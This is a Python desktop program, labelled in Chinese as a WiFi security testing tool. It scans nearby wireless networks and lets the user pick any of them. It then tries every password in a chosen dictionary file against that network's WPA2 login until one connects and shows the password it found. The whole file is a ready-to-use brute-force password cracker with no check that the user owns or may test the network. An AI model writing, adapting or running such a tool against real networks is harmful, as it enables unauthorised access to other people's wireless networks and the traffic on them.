import tkinter as tk
from tkinter import ttk
import tkinter.filedialog
import tkinter.messagebox

import pywifi
from pywifi import const

import threading
import time


class WifiTester:

    def __init__(self, root):

        self.root = root
        self.root.title("WiFi 安全測試工具 Pro")
        self.root.geometry("750x500")

        self.wifi = pywifi.PyWiFi()
        self.iface = self.wifi.interfaces()[0]

        self.wifi_ssid = tk.StringVar()
        self.dict_path = tk.StringVar()
        self.result_pwd = tk.StringVar()

        self.create_ui()

    def create_ui(self):

        frame = ttk.LabelFrame(self.root, text="設定")
        frame.pack(fill="x", padx=10, pady=5)

        ttk.Button(frame, text="掃描 WiFi", command=self.scan_wifi).grid(row=0, column=0, padx=5, pady=5)

        ttk.Button(frame, text="開始測試", command=self.start_test).grid(row=0, column=1, padx=5)

        ttk.Label(frame, text="字典檔：").grid(row=1, column=0)

        ttk.Entry(frame, textvariable=self.dict_path, width=40).grid(row=1, column=1)

        ttk.Button(frame, text="選擇檔案", command=self.select_dict).grid(row=1, column=2)

        ttk.Label(frame, text="WiFi SSID：").grid(row=2, column=0)

        ttk.Entry(frame, textvariable=self.wifi_ssid).grid(row=2, column=1)

        ttk.Label(frame, text="成功密碼：").grid(row=2, column=2)

        ttk.Entry(frame, textvariable=self.result_pwd).grid(row=2, column=3)

        # WiFi列表
        self.tree = ttk.Treeview(self.root, columns=("ssid", "bssid", "signal", "security"), show="headings")

        self.tree.heading("ssid", text="SSID")
        self.tree.heading("bssid", text="BSSID")
        self.tree.heading("signal", text="訊號")
        self.tree.heading("security", text="加密")

        self.tree.column("ssid", width=200)
        self.tree.column("bssid", width=200)
        self.tree.column("signal", width=80)
        self.tree.column("security", width=80)

        self.tree.pack(fill="both", expand=True, padx=10)

        self.tree.bind("<Double-1>", self.select_wifi)

        # 進度條
        self.progress = ttk.Progressbar(self.root, length=400)
        self.progress.pack(pady=5)

        # 日誌
        self.log = tk.Text(self.root, height=8)
        self.log.pack(fill="x", padx=10, pady=5)

    def log_msg(self, msg):

        self.log.insert(tk.END, msg + "\n")
        self.log.see(tk.END)

    def select_dict(self):

        file = tkinter.filedialog.askopenfilename()

        self.dict_path.set(file)

    def scan_wifi(self):

        self.log_msg("開始掃描 WiFi...")

        for item in self.tree.get_children():
            self.tree.delete(item)

        self.iface.scan()

        time.sleep(5)

        results = self.iface.scan_results()

        wifi_set = set()

        for wifi in results:

            if wifi.ssid == "":
                continue

            if wifi.ssid in wifi_set:
                continue

            wifi_set.add(wifi.ssid)

            signal = min(max(2 * (wifi.signal + 100), 0), 100)

            security = "OPEN"

            if wifi.akm:

                if const.AKM_TYPE_WPA2PSK in wifi.akm:
                    security = "WPA2"

                elif const.AKM_TYPE_WPA_PSK in wifi.akm:
                    security = "WPA"

            self.tree.insert("", "end", values=(wifi.ssid, wifi.bssid, f"{signal}%", security))

        self.log_msg("掃描完成")

    def select_wifi(self, event):

        item = self.tree.selection()[0]

        ssid = self.tree.item(item, "values")[0]

        self.wifi_ssid.set(ssid)

        self.log_msg(f"選擇 WiFi: {ssid}")

    def start_test(self):

        thread = threading.Thread(target=self.test_password)

        thread.start()

    def test_password(self):

        ssid = self.wifi_ssid.get()

        path = self.dict_path.get()

        if not ssid or not path:

            tkinter.messagebox.showwarning("提示", "請選擇 WiFi 與字典檔")

            return

        with open(path, "r", encoding="utf-8", errors="ignore") as f:

            passwords = f.readlines()

        total = len(passwords)

        self.progress["maximum"] = total

        for i, pwd in enumerate(passwords):

            pwd = pwd.strip()

            if pwd == "":
                continue

            self.progress["value"] = i + 1

            self.log_msg(f"測試密碼: {pwd}")

            if self.connect_wifi(ssid, pwd):

                self.result_pwd.set(pwd)

                self.log_msg(f"成功！密碼: {pwd}")

                tkinter.messagebox.showinfo("成功", f"WiFi 密碼為: {pwd}")

                return

        self.log_msg("字典測試結束，未找到密碼")

    def connect_wifi(self, ssid, password):

        profile = pywifi.Profile()

        profile.ssid = ssid
        profile.auth = const.AUTH_ALG_OPEN
        profile.akm.append(const.AKM_TYPE_WPA2PSK)
        profile.cipher = const.CIPHER_TYPE_CCMP
        profile.key = password

        self.iface.remove_all_network_profiles()

        tmp = self.iface.add_network_profile(profile)

        self.iface.connect(tmp)

        time.sleep(4)

        if self.iface.status() == const.IFACE_CONNECTED:

            self.iface.disconnect()

            return True

        return False


def main():

    root = tk.Tk()

    app = WifiTester(root)

    root.mainloop()


if __name__ == "__main__":
    main()